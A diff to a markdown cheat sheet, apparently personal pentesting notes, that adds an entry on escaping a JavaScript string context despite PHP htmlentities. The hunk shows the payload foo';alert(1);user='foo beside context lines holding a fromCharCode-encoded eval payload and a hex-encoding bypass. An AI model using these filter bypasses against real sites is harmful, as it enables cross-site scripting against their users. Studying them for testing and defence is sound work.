@@ -27,6 +27,11 @@ AJAX = asynchronous JavaScript (they change their contents by manipulating areas
    `<script>eval(String.fromCharCode(97,108,101,114,116,40,39,<message_here>,39,41))</script>`
    `97,108,101,114,116,40,39,39,41` = `alert('')`
    
+ **3. PHP htmlentities/script injection**
+   * Considering: `<script>var $a= '';</script>` where htmlentities encodes crucial chars.  
+   * Defeat with an injection - must end with declaring a var.
+   `foo';alert(1);user='foo`
+   
  **3. HEX encoding:**  
    * you can encode your payload as HEX, I could not get this to work, however this apparently is a valid bypass  
    
